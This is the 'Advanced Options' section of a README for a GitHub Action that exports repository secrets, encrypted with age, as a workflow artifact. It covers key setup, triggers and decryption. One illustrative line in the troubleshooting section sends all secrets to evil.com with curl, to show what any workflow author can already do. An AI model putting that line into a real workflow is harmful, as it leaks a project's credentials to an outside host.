# Advanced Options

## Fork for Maximum Security (Recommended)

The code is intentionally simple (~40 lines) so you can audit it yourself:

1. Fork this repository to your own account
2. Review the code (it's short!)
3. Use `your-username/github-secrets-exporter@main` in your workflow instead of `gerrywastaken/github-secrets-exporter@main`
4. You control the code and verify no malicious updates occur

This way you're not trusting us - you're trusting code you've personally reviewed.

## Using Different Key Types

### SSH Keys

If you already have an SSH key on GitHub:

```bash
# Get your public key
curl https://github.com/YOUR_USERNAME.keys
```

Use it in your workflow:
```yaml
with:
  public_encryption_key: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKw...'
```

Decrypt with:
```bash
age --decrypt --identity ~/.ssh/id_ed25519 < encrypted-secrets.age
```

### Age Keys

Generate a dedicated age key:

```bash
age-keygen -o ~/private_age.txt
```

This outputs:
```
Public key: age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p
```

Use it in your workflow:
```yaml
with:
  public_encryption_key: 'age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p'
```

Decrypt with:
```bash
age --decrypt --identity ~/private_age.txt < encrypted-secrets.age
```

## How It Works

1. You provide your public encryption key inline in the workflow file
2. Workflow exports all secrets as JSON
3. Encrypts with your public key using `age`
4. Uploads encrypted data as workflow artifact (1-day retention)
5. **You download artifact and decrypt locally with your private key**

## Security Model

- **Public key is inline** in your workflow file (visible, auditable)
- **Secrets only exist in memory** during the workflow - never touch disk
- **Encrypted output as artifact** (not logs) with 1-day retention
- **Private key never leaves your machine**
- Uses **asymmetric encryption** (public/private keys, not passwords)
- Simple, auditable code (~40 lines in `action.yml`)
- **Best practice**: Fork and audit the code before using

### Workflow Trigger Options

**Recommended: `pull_request` trigger**
- Create a PR with the workflow
- Workflow runs automatically on PR creation
- Download secrets, then close PR without merging
- Workflow never enters main branch (safer long-term)

> **Note for forks:** GitHub does not pass repository secrets to workflows that run from forked pull requests. Use a branch in the same repository or a `workflow_dispatch` run if you fork this action.

**Alternative: `workflow_dispatch` trigger**
- Merge workflow to main branch
- Manually trigger when needed
- Workflow lives in main permanently (could be triggered accidentally in future)

**Security note:** Read the [official GitHub documentation on secrets in workflows](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) to understand the security model for your specific setup.

## Example Output

After decryption, you'll see:
```json
{
  "NPM_TOKEN": "npm_abc123...",
  "AWS_ACCESS_KEY_ID": "AKIA...",
  "DATABASE_URL": "postgresql://..."
}
```

You can parse this with `jq` if needed:
```bash
# Get a specific secret
cat decrypted.json | jq -r '.NPM_TOKEN'

# Convert to env format
cat decrypted.json | jq -r 'to_entries[] | "\(.key)=\(.value)"'
```

## Manual Artifact Deletion

For extra security, you can delete the artifact immediately after downloading:

```bash
# Download the artifact first
gh run download --name encrypted-secrets

# Delete the artifact
gh api repos/:owner/:repo/actions/artifacts/ARTIFACT_ID -X DELETE
```

Or delete via the GitHub UI: Actions → Workflow run → Artifacts section → Delete

## Troubleshooting

### "Doesn't this action make my repo unsafe?"

This action doesn't add new attack surface that doesn't already exist.

**Important:** GitHub's security model for workflows and secrets is complex. Please read the [official documentation on secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) to understand your specific risk profile.

Generally speaking: Anyone who can create/modify workflows in your repo can already access secrets:

```yaml
# Any workflow can do this:
- run: curl https://evil.com -d "${{ toJSON(secrets) }}"
```

This export action just makes intentional export easier - it doesn't change the fundamental security model.

But as long as you don't merge somebody's dodgy workflow, then they will only get a limited temporary github token made specficially for that workflow run by Github. See the real security test I ran here using an alt account as the attacker: https://github.com/gerrywastaken/github-secrets-exporter/pull/4

### "no identity matched any of the recipients" or "Failed to decrypt"

The private key you're using doesn't match the public key used for encryption.

Solutions:
1. Check which public key is in your workflow file (look at `public_encryption_key`)
2. If using SSH key: try different keys (`~/.ssh/id_ed25519`, `~/.ssh/id_rsa`, `~/.ssh/id_ecdsa`)
3. If using age key: make sure you're using the correct `private_age.txt` file
4. Verify the public key hasn't changed since the workflow ran
